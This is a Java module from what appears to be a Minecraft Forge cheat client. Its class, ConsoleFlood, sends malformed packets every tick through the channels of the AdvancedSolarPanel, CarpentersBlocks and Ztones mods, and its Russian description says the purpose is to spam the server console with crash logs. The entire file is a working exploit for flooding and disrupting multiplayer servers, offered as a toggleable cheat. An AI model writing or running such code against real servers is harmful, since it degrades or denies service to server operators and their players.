package forgefuck.team.xenobyte.modules;

import cpw.mods.fml.common.Loader;
import forgefuck.team.xenobyte.api.module.Category;
import forgefuck.team.xenobyte.api.module.CheatModule;
import forgefuck.team.xenobyte.api.module.PerformMode;

public class ConsoleFlood extends CheatModule {
    
    public ConsoleFlood() {
        super("ConsoleFlood", Category.MODS, PerformMode.TOGGLE);
    }
    
    @Override public void onTick(boolean inGame) {
        if (inGame) {
            utils.sendPacket("AdvSolarPanels", (byte) 1);
            utils.sendPacket("CarpentersBlocks", -1);
            utils.sendPacket("Ztones", -1);
        }
    }
    
    @Override public boolean isWorking() {
        return Loader.isModLoaded("AdvancedSolarPanel") || Loader.isModLoaded("CarpentersBlocks") || Loader.isModLoaded("Ztones");
    }
    
    @Override public String moduleDesc() {
        return "Спам в консоль краш-логами";
    }

}
